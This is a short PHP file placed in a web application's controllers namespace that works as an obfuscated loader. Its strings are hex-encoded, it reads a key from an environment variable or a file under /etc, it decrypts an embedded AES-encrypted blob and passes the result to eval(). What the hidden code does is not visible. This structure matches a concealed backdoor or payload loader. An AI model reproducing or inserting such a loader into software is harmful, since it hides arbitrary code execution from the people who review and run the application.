<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('9OCxgu+Mty19W10vx/FfqQ==');

$c=base64_decode(

'jD/gLYzNB/rPq3/ZWM0UBxGbeMMCskjMUE+9xDAHRxZ0WyX0Dy4utvpXIvlCP2KTqOEtEhwIPIr6' .
'cU2xQ8JTNSPJVbDE//IU9iHkwqxROtskrieSdjDGSoPnxzDkeY+EwYTTfuC3ZESNRPOWSp61q7E9' .
'MwX0p0zYI3rjlhhQVGlz5aKwbBBZGu3knJSSQW3O1sEDBXhuqnSXPDJSlFKDXDF+G0nWfEKg+h2/' .
'ZRuieG52Wzo0gkj8y49Mte3LphXyZnIXj7it8m3oj4acYX4g+A=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

